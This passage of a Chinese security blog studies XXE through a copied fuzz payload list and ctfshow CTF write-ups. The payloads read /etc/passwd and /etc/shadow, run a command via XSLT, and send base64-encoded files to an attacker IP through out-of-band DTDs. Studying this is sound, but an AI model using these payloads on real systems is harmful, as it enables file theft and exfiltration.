fallback。常用的命名空间前缀是“xi”（但可以根据喜好自由使用任何前缀）</p>\n<p>首先使用xmls来定义命名空间为xi</p>\n<p>然后接下来就可以使用定义好的xi命名空间中的include来包含文件了,parse可以将文件属性进行转换,转换成text进行包含输出</p>\n<p>一个例子</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">foo</span> <span class=\"attr\">xmlns:xi</span>=<span class=\"string\">&quot;http://www.we.org/2003/XInclude&quot;</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">xi:include</span> <span class=\"attr\">parse</span>=<span class=\"string\">&quot;text&quot;</span> <span class=\"attr\">href</span>=<span class=\"string\">&quot;file:///etc/passwd&quot;</span>/&gt;</span>//    单标签别忘了反斜杠</span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">foo</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<h5 id=\"SVG-矢量图\"><a href=\"#SVG-矢量图\" class=\"headerlink\" title=\"SVG(矢量图)\"></a>SVG(矢量图)</h5><p>使用Apache中的Batik库解析矢量图,可以解析xml文档</p>\n<p><img src=\"https://gitee.com/blue_satchel/images/raw/master/image-20220109171338198.png\" alt=\"image-20220109171338198\"></p>\n<h5 id=\"对大佬写的xxe-fuzz的阅读理解\"><a href=\"#对大佬写的xxe-fuzz的阅读理解\" class=\"headerlink\" title=\"对大佬写的xxe fuzz的阅读理解\"></a>对大佬写的xxe fuzz的阅读理解</h5><figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;</span></span><br><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE <span class=\"meta-keyword\">xxe</span> [<span class=\"meta\">&lt;!ENTITY <span class=\"meta-keyword\">foo</span> <span class=\"meta-string\">&quot;aaaaaa&quot;</span>&gt;</span>]&gt;</span></span><br><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE <span class=\"meta-keyword\">xxe</span> [<span class=\"meta\">&lt;!ENTITY <span class=\"meta-keyword\">foo</span> <span class=\"meta-string\">&quot;aaaaaa&quot;</span>&gt;</span>]&gt;</span><span class=\"tag\">&lt;<span class=\"name\">root</span>&gt;</span><span class=\"symbol\">&amp;foo;</span><span class=\"tag\">&lt;/<span class=\"name\">root</span>&gt;</span></span><br><span class=\"line\"><span class=\"meta\">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;</span><span class=\"meta\">&lt;!DOCTYPE <span class=\"meta-keyword\">xxe</span> [<span class=\"meta\">&lt;!ENTITY <span class=\"meta-keyword\">foo</span> <span class=\"meta-string\">&quot;aaaaaa&quot;</span>&gt;</span>]&gt;</span></span><br><span class=\"line\"><span class=\"meta\">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;</span><span class=\"meta\">&lt;!DOCTYPE <span class=\"meta-keyword\">xxe</span> [<span class=\"meta\">&lt;!ENTITY <span class=\"meta-keyword\">foo</span> <span class=\"meta-string\">&quot;aaaaaa&quot;</span>&gt;</span>]&gt;</span><span class=\"tag\">&lt;<span class=\"name\">root</span>&gt;</span><span class=\"symbol\">&amp;foo;</span><span class=\"tag\">&lt;/<span class=\"name\">root</span>&gt;</span></span><br><span class=\"line\"><span class=\"meta\">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;</span><span class=\"tag\">&lt;<span class=\"name\">test</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">test</span>&gt;</span></span><br><span class=\"line\"><span class=\"meta\">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;</span><span class=\"meta\">&lt;!DOCTYPE <span class=\"meta-keyword\">foo</span> [<span class=\"meta\">&lt;!ELEMENT <span class=\"meta-keyword\">foo</span> <span class=\"meta-keyword\">ANY</span> &gt;</span><span class=\"meta\">&lt;!ENTITY <span class=\"meta-keyword\">xxe</span> <span class=\"meta-keyword\">SYSTEM</span> <span class=\"meta-string\">&quot;file:///etc/passwd&quot;</span> &gt;</span>]&gt;</span><span class=\"tag\">&lt;<span class=\"name\">foo</span>&gt;</span><span class=\"symbol\">&amp;xxe;</span><span class=\"tag\">&lt;/<span class=\"name\">foo</span>&gt;</span></span><br><span class=\"line\"><span class=\"meta\">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;</span><span class=\"meta\">&lt;!DOCTYPE <span class=\"meta-keyword\">foo</span> [<span class=\"meta\">&lt;!ELEMENT <span class=\"meta-keyword\">foo</span> <span class=\"meta-keyword\">ANY</span> &gt;</span><span class=\"meta\">&lt;!ENTITY <span class=\"meta-keyword\">xxe</span> <span class=\"meta-keyword\">SYSTEM</span> <span class=\"meta-string\">&quot;file:///etc/passwd&quot;</span> &gt;</span>]&gt;</span></span><br><span class=\"line\"><span class=\"meta\">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;</span><span class=\"meta\">&lt;!DOCTYPE <span class=\"meta-keyword\">foo</span> [<span class=\"meta\">&lt;!ELEMENT <span class=\"meta-keyword\">foo</span> <span class=\"meta-keyword\">ANY</span> &gt;</span><span class=\"meta\">&lt;!ENTITY <span class=\"meta-keyword\">xxe</span> <span class=\"meta-keyword\">SYSTEM</span> <span class=\"meta-string\">&quot;file:///etc/issue&quot;</span> &gt;</span>]&gt;</span><span class=\"tag\">&lt;<span class=\"name\">foo</span>&gt;</span><span class=\"symbol\">&amp;xxe;</span><span class=\"tag\">&lt;/<span class=\"name\">foo</span>&gt;</span></span><br><span class=\"line\"><span class=\"meta\">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;</span><span class=\"meta\">&lt;!DOCTYPE <span class=\"meta-keyword\">foo</span> [<span class=\"meta\">&lt;!ELEMENT <span class=\"meta-keyword\">foo</span> <span class=\"meta-keyword\">ANY</span> &gt;</span><span class=\"meta\">&lt;!ENTITY <span class=\"meta-keyword\">xxe</span> <span class=\"meta-keyword\">SYSTEM</span> <span class=\"meta-string\">&quot;file:///etc/issue&quot;</span> &gt;</span>]&gt;</span></span><br><span class=\"line\"><span class=\"meta\">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;</span><span class=\"meta\">&lt;!DOCTYPE <span class=\"meta-keyword\">foo</span> [<span class=\"meta\">&lt;!ELEMENT <span class=\"meta-keyword\">foo</span> <span class=\"meta-keyword\">ANY</span> &gt;</span><span class=\"meta\">&lt;!ENTITY <span class=\"meta-keyword\">xxe</span> <span class=\"meta-keyword\">SYSTEM</span> <span class=\"meta-string\">&quot;file:///etc/shadow&quot;</span> &gt;</span>]&gt;</span><span class=\"tag\">&lt;<span class=\"name\">foo</span>&gt;</span><span class=\"symbol\">&amp;xxe;</span><span class=\"tag\">&lt;/<span class=\"name\">foo</span>&gt;</span></span><br><span class=\"line\"><span class=\"meta\">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;</span><span class=\"meta\">&lt;!DOCTYPE <span class=\"meta-keyword\">foo</span> [<span class=\"meta\">&lt;!ELEMENT <span class=\"meta-keyword\">foo</span> <span class=\"meta-keyword\">ANY</span> &gt;</span><span class=\"meta\">&lt;!ENTITY <span class=\"meta-keyword\">xxe</span> <span class=\"meta-keyword\">SYSTEM</span> <span class=\"meta-string\">&quot;file:///etc/shadow&quot;</span> &gt;</span>]&gt;</span></span><br><span class=\"line\"><span class=\"meta\">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;</span><span class=\"meta\">&lt;!DOCTYPE <span class=\"meta-keyword\">foo</span> [<span class=\"meta\">&lt;!ELEMENT <span class=\"meta-keyword\">foo</span> <span class=\"meta-keyword\">ANY</span> &gt;</span><span class=\"meta\">&lt;!ENTITY <span class=\"meta-keyword\">xxe</span> <span class=\"meta-keyword\">SYSTEM</span> <span class=\"meta-string\">&quot;file:///c:/boot.ini&quot;</span> &gt;</span>]&gt;</span><span class=\"tag\">&lt;<span class=\"name\">foo</span>&gt;</span><span class=\"symbol\">&amp;xxe;</span><span class=\"tag\">&lt;/<span class=\"name\">foo</span>&gt;</span></span><br><span class=\"line\"><span class=\"meta\">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;</span><span class=\"meta\">&lt;!DOCTYPE <span class=\"meta-keyword\">foo</span> [<span class=\"meta\">&lt;!ELEMENT <span class=\"meta-keyword\">foo</span> <span class=\"meta-keyword\">ANY</span> &gt;</span><span class=\"meta\">&lt;!ENTITY <span class=\"meta-keyword\">xxe</span> <span class=\"meta-keyword\">SYSTEM</span> <span class=\"meta-string\">&quot;file:///c:/boot.ini&quot;</span> &gt;</span>]&gt;</span></span><br><span class=\"line\"><span class=\"meta\">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;</span><span class=\"meta\">&lt;!DOCTYPE <span class=\"meta-keyword\">foo</span> [<span class=\"meta\">&lt;!ELEMENT <span class=\"meta-keyword\">foo</span> <span class=\"meta-keyword\">ANY</span> &gt;</span><span class=\"meta\">&lt;!ENTITY <span class=\"meta-keyword\">xxe</span> <span class=\"meta-keyword\">SYSTEM</span> <span class=\"meta-string\">&quot;http://example.com:80&quot;</span> &gt;</span>]&gt;</span><span class=\"tag\">&lt;<span class=\"name\">foo</span>&gt;</span><span class=\"symbol\">&amp;xxe;</span><span class=\"tag\">&lt;/<span class=\"name\">foo</span>&gt;</span></span><br><span class=\"line\"><span class=\"meta\">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;</span><span class=\"meta\">&lt;!DOCTYPE <span class=\"meta-keyword\">foo</span> [<span class=\"meta\">&lt;!ELEMENT <span class=\"meta-keyword\">foo</span> <span class=\"meta-keyword\">ANY</span> &gt;</span><span class=\"meta\">&lt;!ENTITY <span class=\"meta-keyword\">xxe</span> <span class=\"meta-keyword\">SYSTEM</span> <span class=\"meta-string\">&quot;http://example:443&quot;</span> &gt;</span>]&gt;</span></span><br><span class=\"line\"><span class=\"meta\">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;</span><span class=\"meta\">&lt;!DOCTYPE <span class=\"meta-keyword\">foo</span> [<span class=\"meta\">&lt;!ELEMENT <span class=\"meta-keyword\">foo</span> <span class=\"meta-keyword\">ANY</span>&gt;</span><span class=\"meta\">&lt;!ENTITY <span class=\"meta-keyword\">xxe</span> <span class=\"meta-keyword\">SYSTEM</span> <span class=\"meta-string\">&quot;file:////dev/random&quot;</span>&gt;</span>]&gt;</span><span class=\"tag\">&lt;<span class=\"name\">foo</span>&gt;</span><span class=\"symbol\">&amp;xxe;</span><span class=\"tag\">&lt;/<span class=\"name\">foo</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">test</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">test</span>&gt;</span></span><br><span class=\"line\">&lt;![CDATA[&lt;test&gt;&lt;/test&gt;]]&gt;</span><br><span class=\"line\"><span class=\"symbol\">&amp;foo;</span></span><br><span class=\"line\">%foo;</span><br><span class=\"line\">count(/child::node())</span><br><span class=\"line\">x&#x27; or name()=&#x27;username&#x27; or &#x27;x&#x27;=&#x27;y</span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">name</span>&gt;</span>&#x27;,&#x27;&#x27;)); phpinfo(); exit;/*<span class=\"tag\">&lt;/<span class=\"name\">name</span>&gt;</span></span><br><span class=\"line\">&lt;![CDATA[&lt;script&gt;var n=0;while(true)&#123;n++;&#125;&lt;/script&gt;]]&gt;</span><br><span class=\"line\">&lt;![CDATA[&lt;]]&gt;SCRIPT&lt;![CDATA[&gt;]]&gt;alert(&#x27;XSS&#x27;);&lt;![CDATA[&lt;]]&gt;/SCRIPT&lt;![CDATA[&gt;]]&gt;</span><br><span class=\"line\"><span class=\"meta\">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;</span><span class=\"tag\">&lt;<span class=\"name\">foo</span>&gt;</span>&lt;![CDATA[&lt;]]&gt;SCRIPT&lt;![CDATA[&gt;]]&gt;alert(&#x27;XSS&#x27;);&lt;![CDATA[&lt;]]&gt;/SCRIPT&lt;![CDATA[&gt;]]&gt;<span class=\"tag\">&lt;/<span class=\"name\">foo</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">foo</span>&gt;</span>&lt;![CDATA[&lt;]]&gt;SCRIPT&lt;![CDATA[&gt;]]&gt;alert(&#x27;XSS&#x27;);&lt;![CDATA[&lt;]]&gt;/SCRIPT&lt;![CDATA[&gt;]]&gt;<span class=\"tag\">&lt;/<span class=\"name\">foo</span>&gt;</span></span><br><span class=\"line\"><span class=\"meta\">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;</span><span class=\"tag\">&lt;<span class=\"name\">foo</span>&gt;</span>&lt;![CDATA[&#x27; or 1=1 or &#x27;&#x27;=&#x27;]]&gt;<span class=\"tag\">&lt;/<span class=\"name\">foo</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">foo</span>&gt;</span>&lt;![CDATA[&#x27; or 1=1 or &#x27;&#x27;=&#x27;]]&gt;<span class=\"tag\">&lt;/<span class=\"name\">foo</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">xml</span> <span class=\"attr\">ID</span>=<span class=\"string\">I</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">X</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">C</span>&gt;</span>&lt;![CDATA[&lt;IMG SRC=&quot;javas]]&gt;&lt;![CDATA[cript:alert(&#x27;XSS&#x27;);&quot;&gt;]]&gt;</span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">xml</span> <span class=\"attr\">ID</span>=<span class=\"string\">&quot;xss&quot;</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">I</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">B</span>&gt;</span><span class=\"symbol\">&amp;lt;</span>IMG SRC=&quot;javas<span class=\"comment\">&lt;!-- --&gt;</span>cript:alert(&#x27;XSS&#x27;)&quot;<span class=\"symbol\">&amp;gt;</span><span class=\"tag\">&lt;/<span class=\"name\">B</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">I</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">xml</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">SPAN</span> <span class=\"attr\">DATASRC</span>=<span class=\"string\">&quot;#xss&quot;</span> <span class=\"attr\">DATAFLD</span>=<span class=\"string\">&quot;B&quot;</span> <span class=\"attr\">DATAFORMATAS</span>=<span class=\"string\">&quot;HTML&quot;</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">SPAN</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">C</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">X</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">xml</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">SPAN</span> <span class=\"attr\">DATASRC</span>=<span class=\"string\">#I</span> <span class=\"attr\">DATAFLD</span>=<span class=\"string\">C</span> <span class=\"attr\">DATAFORMATAS</span>=<span class=\"string\">HTML</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">SPAN</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">xml</span> <span class=\"attr\">SRC</span>=<span class=\"string\">&quot;xsstest.xml&quot;</span> <span class=\"attr\">ID</span>=<span class=\"string\">I</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">xml</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">SPAN</span> <span class=\"attr\">DATASRC</span>=<span class=\"string\">#I</span> <span class=\"attr\">DATAFLD</span>=<span class=\"string\">C</span> <span class=\"attr\">DATAFORMATAS</span>=<span class=\"string\">HTML</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">SPAN</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">SPAN</span> <span class=\"attr\">DATASRC</span>=<span class=\"string\">#I</span> <span class=\"attr\">DATAFLD</span>=<span class=\"string\">C</span> <span class=\"attr\">DATAFORMATAS</span>=<span class=\"string\">HTML</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">SPAN</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">xml</span> <span class=\"attr\">SRC</span>=<span class=\"string\">&quot;xsstest.xml&quot;</span> <span class=\"attr\">ID</span>=<span class=\"string\">I</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">xml</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">HTML</span> <span class=\"attr\">xmlns:xss</span>&gt;</span>&lt;?import namespace=&quot;xss&quot; implementation=&quot;http://ha.ckers.org/xss.htc&quot;&gt;<span class=\"tag\">&lt;<span class=\"name\">xss:xss</span>&gt;</span>XSS<span class=\"tag\">&lt;/<span class=\"name\">xss:xss</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">HTML</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">HTML</span> <span class=\"attr\">xmlns:xss</span>&gt;</span>&lt;?import namespace=&quot;xss&quot; implementation=&quot;http://ha.ckers.org/xss.htc&quot;&gt;</span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">xsl:stylesheet</span> <span class=\"attr\">version</span>=<span class=\"string\">&quot;1.0&quot;</span> <span class=\"attr\">xmlns:xsl</span>=<span class=\"string\">&quot;http://www.w3.org/1999/XSL/Transform&quot;</span> <span class=\"attr\">xmlns:php</span>=<span class=\"string\">&quot;http://php.net/xsl&quot;</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">xsl:template</span> <span class=\"attr\">match</span>=<span class=\"string\">&quot;/&quot;</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span>alert(123)<span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">xsl:template</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">xsl:stylesheet</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">xsl:stylesheet</span> <span class=\"attr\">version</span>=<span class=\"string\">&quot;1.0&quot;</span> <span class=\"attr\">xmlns:xsl</span>=<span class=\"string\">&quot;http://www.w3.org/1999/XSL/Transform&quot;</span> <span class=\"attr\">xmlns:php</span>=<span class=\"string\">&quot;http://php.net/xsl&quot;</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">xsl:template</span> <span class=\"attr\">match</span>=<span class=\"string\">&quot;/&quot;</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">xsl:copy-of</span> <span class=\"attr\">select</span>=<span class=\"string\">&quot;document(&#x27;/etc/passwd&#x27;)&quot;</span>/&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">xsl:template</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">xsl:stylesheet</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">xsl:stylesheet</span> <span class=\"attr\">version</span>=<span class=\"string\">&quot;1.0&quot;</span> <span class=\"attr\">xmlns:xsl</span>=<span class=\"string\">&quot;http://www.w3.org/1999/XSL/Transform&quot;</span> <span class=\"attr\">xmlns:php</span>=<span class=\"string\">&quot;http://php.net/xsl&quot;</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">xsl:template</span> <span class=\"attr\">match</span>=<span class=\"string\">&quot;/&quot;</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">xsl:value-of</span> <span class=\"attr\">select</span>=<span class=\"string\">&quot;php:function(&#x27;passthru&#x27;,&#x27;ls -la&#x27;)&quot;</span>/&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">xsl:template</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">xsl:stylesheet</span>&gt;</span></span><br><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE <span class=\"meta-keyword\">foo</span> [<span class=\"meta\">&lt;!ELEMENT <span class=\"meta-keyword\">foo</span> <span class=\"meta-keyword\">ANY</span> &gt;</span><span class=\"meta\">&lt;!ENTITY <span class=\"meta-keyword\">xxe</span> <span class=\"meta-keyword\">SYSTEM</span> <span class=\"meta-string\">&quot;file:///etc/passwd&quot;</span> &gt;</span>]&gt;</span></span><br><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE <span class=\"meta-keyword\">foo</span> [<span class=\"meta\">&lt;!ELEMENT <span class=\"meta-keyword\">foo</span> <span class=\"meta-keyword\">ANY</span> &gt;</span><span class=\"meta\">&lt;!ENTITY <span class=\"meta-keyword\">xxe</span> <span class=\"meta-keyword\">SYSTEM</span> <span class=\"meta-string\">&quot;file:///etc/shadow&quot;</span> &gt;</span>]&gt;</span></span><br><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE <span class=\"meta-keyword\">foo</span> [<span class=\"meta\">&lt;!ELEMENT <span class=\"meta-keyword\">foo</span> <span class=\"meta-keyword\">ANY</span> &gt;</span><span class=\"meta\">&lt;!ENTITY <span class=\"meta-keyword\">xxe</span> <span class=\"meta-keyword\">SYSTEM</span> <span class=\"meta-string\">&quot;file:///c:/boot.ini&quot;</span> &gt;</span>]&gt;</span></span><br><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE <span class=\"meta-keyword\">foo</span> [<span class=\"meta\">&lt;!ELEMENT <span class=\"meta-keyword\">foo</span> <span class=\"meta-keyword\">ANY</span> &gt;</span><span class=\"meta\">&lt;!ENTITY <span class=\"meta-keyword\">xxe</span> <span class=\"meta-keyword\">SYSTEM</span> <span class=\"meta-string\">&quot;http://example.com/text.txt&quot;</span> &gt;</span>]&gt;</span></span><br><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE <span class=\"meta-keyword\">foo</span> [<span class=\"meta\">&lt;!ELEMENT <span class=\"meta-keyword\">foo</span> <span class=\"meta-keyword\">ANY</span>&gt;</span><span class=\"meta\">&lt;!ENTITY <span class=\"meta-keyword\">xxe</span> <span class=\"meta-keyword\">SYSTEM</span> <span class=\"meta-string\">&quot;file:////dev/random&quot;</span>&gt;</span>]&gt;</span></span><br><span class=\"line\"><span class=\"meta\">&lt;!ENTITY % <span class=\"meta-keyword\">int</span> <span class=\"meta-string\">&quot;&lt;!ENTITY &amp;#37; trick SYSTEM &#x27;http://127.0.0.1:80/?%file;&#x27;&gt;  &quot;</span>&gt;</span> %int;</span><br><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE <span class=\"meta-keyword\">xxe</span> [ <span class=\"meta\">&lt;!ENTITY % <span class=\"meta-keyword\">file</span> <span class=\"meta-keyword\">SYSTEM</span> <span class=\"meta-string\">&quot;file:///etc/issue&quot;</span>&gt;</span><span class=\"meta\">&lt;!ENTITY % <span class=\"meta-keyword\">dtd</span> <span class=\"meta-keyword\">SYSTEM</span> <span class=\"meta-string\">&quot;http://example.com/evil.dtd&quot;</span>&gt;</span>%dtd;%trick;]&gt;</span></span><br><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE <span class=\"meta-keyword\">xxe</span> [ <span class=\"meta\">&lt;!ENTITY % <span class=\"meta-keyword\">file</span> <span class=\"meta-keyword\">SYSTEM</span> <span class=\"meta-string\">&quot;file:///c:/boot.ini&quot;</span>&gt;</span><span class=\"meta\">&lt;!ENTITY % <span class=\"meta-keyword\">dtd</span> <span class=\"meta-keyword\">SYSTEM</span> <span class=\"meta-string\">&quot;http://example.com/evil.dtd&quot;</span>&gt;</span>%dtd;%trick;]&gt;</span></span><br></pre></td></tr></table></figure>\n\n"},{"title":"xxe题目","date":"2021-12-25T05:06:11.000Z","typora-root-url":"..","description":"一些xxe题目实践","_content":"\n## ctfshow\n\n### ctfshow web 373\n\nphp://input\n\n从官网信息来看，php://input是一个只读信息流，当请求方式是post的，并且enctype不等于”multipart/form-data”时，可以使用php://input来获取原始请求的数据。\n\n数据包中反倒是不管是get还是post,php://input都会<label style=\"color:red\">读取post类型数据包中变量位置</label>的数据(就是header头空一行下面的数据)\n\n```php\n<?php\nerror_reporting(0);\nlibxml_disable_entity_loader(false);//设置为false则允许外部实体加载\n$xmlfile = file_get_contents('php://input');//将获取到的数据包内容转换成字符串\nif(isset($xmlfile)){\n    $dom = new DOMDocument();\n    $dom->loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);//LIBXML_NOENT 该标志允许替换XML字符实体引用(无论是否外部)也就是允许 &a; 这样的写法\n    $creds = simplexml_import_dom($dom);//把 DOM 节点转换为 SimpleXMLElement 对象。\n    $ctfshow = $creds->ctfshow;//找到里面的ctfshow标签\n    echo $ctfshow;//输出ctfshow标签的内容\n}\nhighlight_file(__FILE__);    \n\n\n\n```\n\n综合上面的分析,得知只需要将ctfshow标签中的内容设置成想要的内容即可,但是不能直接将ctfshow设置为根标签,在外部随便加一个标签就行\n\n##### payload\n\n```xml\n<?xml version=\"1.0\"?>\n<!DOCTYPE test [\n<!ENTITY xxe SYSTEM \"file:///flag\">\n]>\n//上面为内部dtd文档\n<neo>\n<ctfshow>&xxe;</ctfshow>\n</neo>\n```\n\n### ctfshow web 374\n\n本题没有回显,需要使用外带dtd\n\n利用python在云服务器搭建一个http服务器,并保持监听\n\n`python3 -m http.server 5555`\n\n题目代码\n\n```php\nerror_reporting(0);\nlibxml_disable_entity_loader(false);\n$xmlfile = file_get_contents('php://input');\nif(isset($xmlfile)){\n    $dom = new DOMDocument();\n    $dom->loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);\n}\nhighlight_file(__FILE__);    \n\n```\n\n本题有个疑问,就是为什么要使用php伪协议,突然想到本题没有回显,结合做过的文件包含题目,只有采用php伪协议才能读取到源码,就算是将文件包含进去了,也是执行代码,代码中不做输出,页面就不会显示输出\n\n\n\n起初这样写了dtd文档\n\n```dtd\n<!ENTITY % b SYSTEM \"http://121.40.113.226:5555/php://filter/read=convert.base64-encode/resource=/flag\">\n%b;\n```\n\nxml\n\n```xml\n<?xml version=\"1.0\"?>\n<!DOCTYPE a[\n\t<!ENTITY % xxe SYSTEM \"http://121.40.113.226:5555/Python-3.8.3/payload_xml/oob.dtd\">\n\t%xxe;\n\n]>\n```\n\n服务端给了这样的回显,说明是没有使用php协议,当成了路径,仔细一想,应该使用另一个实体来替换后面的伪协议内容\n\n![image-20220110180025568](https://gitee.com/blue_satchel/images/raw/master/image-20220110180025568.png)\n\n 更改后的dtd文档\n\n```dtd\n<!ENTITY % file SYSTEM \"php://filter/read=convert.base64-encode/resource=/flag\">\n<!ENTITY % b SYSTEM \"http://121.40.113.226:5555/%file;\">\n%b;\n```\n\n这次服务端回显了200,说明有成功请求到dtd文档,但是忘了一个问题,这里的file变量需要读取的内容在靶机上,而我这样写就是读取攻击机的内容了......\n\n![image-20220110180342295](https://gitee.com/blue_satchel/images/raw/master/image-20220110180342295.png)\n\n查看了别人写的payload,明白了基本原理:利用xml的变量机制,把请求路径转换成通过base64编码的文件内容,所以得到的返回值是404\n\n![image-20220110182024289](https://gitee.com/blue_satchel/images/raw/master/image-20220110182024289.png)\n\n##### payload\n\nxml\n\nxml通过前面的尝试已经完全理解了\n\n```xml\n<!DOCTYPE test [\n<!ENTITY % file SYSTEM \"php://filter/read=convert.base64-encode/resource=/flag\">\n<!ENTITY % aaa SYSTEM \"http://121.40.113.226:5555/Python-3.8.3/payload_xml/oob.dtd\">\n%aaa;\n]>\n<test>123</test>\n\n```\n\ndtd\n\n```dtd\n<!ENTITY % dtd \"<!ENTITY &#x25; xxe  SYSTEM 'http://121.40.113.226:5555/%file;'> 